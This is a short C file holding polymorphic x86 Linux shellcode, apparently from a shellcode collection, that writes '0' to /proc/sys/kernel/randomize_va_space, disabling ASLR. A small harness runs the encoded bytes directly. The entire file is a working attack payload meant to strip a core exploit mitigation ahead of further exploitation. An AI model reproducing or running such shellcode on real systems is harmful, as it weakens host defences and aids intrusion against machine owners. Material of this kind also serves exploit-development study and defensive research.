/* Title: Polymorphic ASLR deactivation ( 81 bytes)
 * Author: pktmonky
 * Description: Polymorphic version of shell-storm linux x86 shellcode titled
 * 'ASLR deactivation' by Jean Pascal Pereira.
 */


#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\x31\xdb\xf7\xe3\xeb\x22\x5b\x89\x53\x24\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x93\x53\x66\x68\x30\x3a\x89\xe1\x42\x31\xc0\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xd9\xff\xff\xff\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
